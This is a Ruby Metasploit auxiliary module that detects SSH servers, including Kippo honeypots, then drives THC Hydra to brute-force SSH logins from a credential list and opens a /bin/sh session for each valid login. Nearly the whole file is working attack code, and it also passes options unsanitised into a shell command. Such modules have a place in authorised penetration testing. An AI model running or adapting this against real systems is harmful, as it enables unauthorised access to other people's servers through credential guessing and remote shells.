# 
# Copyright (c) 2011 Xavier Garcia  http://www.shellguardians.com
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
require 'msf/core'
require 'tempfile'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::CommandShell

	def initialize
		super(
			'Name'        => 'Scanning SSH servers with Hydra',
			'Version'     => '$Revision: 1 $',
			'Description' => %q{This module will launch THC hydra to brute-force the ssh credentials
					and then open the sessions with the valid ones.
			},
			'Author'      => ['ghosthunter'],
			'License'     => MSF_LICENSE
		)

		deregister_options("THREADS","RHOST")
		register_options(
			[
				OptString.new('CREDENTIALS', [ true, 'colon separated list of credentials', '/tmp/credentials']),
				OptString.new('TASKS', [ true, 'number of connexions in parallel', '8']),
				OptString.new('TIMEOUT', [ true, 'timeout for the responses', '30']),
				Opt::RPORT(22)
			], self.class
		)
	end

	def rport
		datastore['RPORT']
	end

	def new_session(ip,rport,username,password)
		opt_hash = {
			:auth_methods => ['password','keyboard-interactive'],
			:msframework  => framework,
			:msfmodule    => self,
			:port         => rport,
			:password     => password
		}
		ssh_socket = Net::SSH.start(
			ip,
			username,
			opt_hash
		)

		conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)

		merge_me = {
			'USERPASS_FILE' => nil,
			'USER_FILE'     => nil,
			'PASS_FILE'     => nil,
			'USERNAME'      => username,
			'PASSWORD'      => password
		}
		start_session(self, "#{username}:#{password} (#{ip}:#{rport})", merge_me, false, conn.lsock)
	
	end



	def call_hydra(ip)
		credentials=datastore['CREDENTIALS']
		threads=datastore['TASKS']
		timeout=datastore['TIMEOUT']
		fd=Tempfile.new('hydra')
		logfile=fd.path
		fd.close
		print_status("#{ip}:#{rport}  #{credentials} - Calling Hydra")
		%x[hydra -f -o #{logfile} -w #{timeout} -t #{threads} -s #{rport} -C #{credentials} #{ip}  ssh2]
		File.open(logfile, "r") do |infile|
			while (line = infile.gets)
				test= line =~ /^\[#{rport}\]\[ssh2\] host: #{ip}   login: (.*)   password: (.*)$/
				if test != nil
					print_status("Valid credentials found: #{ip} #{$1} #{$2}")
					new_session(ip,rport,$1,$2)
				end
		
			end
		end
		File.delete(logfile)
	end





	def run_host(ip)
		available=false
		begin
			::Timeout.timeout(60) do

				connect

				resp = sock.get_once(-1, 5)

				if (resp and resp =~ /SSH/)
					ver,msg = (resp.split(/[\r\n]+/))
					# Check to see if this is Kippo, which sends a premature
					# key init exchange right on top of the SSH version without
					# waiting for the required client identification string.
					if msg and msg.size >= 5
						extra = msg.unpack("NCCA*") # sz, pad_sz, code, data
						if (extra.last.size+2 == extra[0]) and extra[2] == 20
							ver << " (Kippo Honeypot)"
						end
					end
					print_status("#{ip}:#{rport}, SSH server version: #{ver}")
					report_service(:host => rhost, :port => rport, :name => "ssh", :proto => "tcp", :info => ver)
					available=true
				else
					print_error("#{ip}:#{rport}, SSH server version detection failed!")
				end

				disconnect
			end

		rescue Timeout::Error
			print_error("#{ip}:#{rport}, Server timed out after 60 seconds. Skipping.")
		end
		if available
			print_status("Attacking #{ip}")
			call_hydra(ip)
		end
	end

end

